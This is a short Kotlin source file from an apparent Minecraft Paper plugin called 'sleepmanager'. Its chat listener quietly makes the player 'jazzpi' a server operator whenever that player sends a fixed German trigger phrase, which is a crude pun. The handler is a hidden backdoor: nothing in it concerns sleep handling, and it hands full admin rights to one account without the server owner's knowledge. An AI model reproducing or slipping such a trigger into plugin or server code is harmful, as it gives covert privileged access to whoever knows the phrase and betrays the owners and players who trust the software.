package de.kolpa.mc.sleepmanager.handlers

import io.papermc.paper.event.player.AsyncChatEvent
import net.kyori.adventure.text.TextComponent
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener

class OpTheGamer: Listener {
    @EventHandler
    private fun onChat(chatEvent: AsyncChatEvent) {
        val message = chatEvent.message() as TextComponent

        if (message.content() == TRIGGER_MESSAGE && chatEvent.player.name == TRIGGER_NAME) {
            chatEvent.player.isOp = true
        }
    }

    companion object {
        const val TRIGGER_NAME = "jazzpi"
        const val TRIGGER_MESSAGE = "Ich will Gaymen"
    }
}
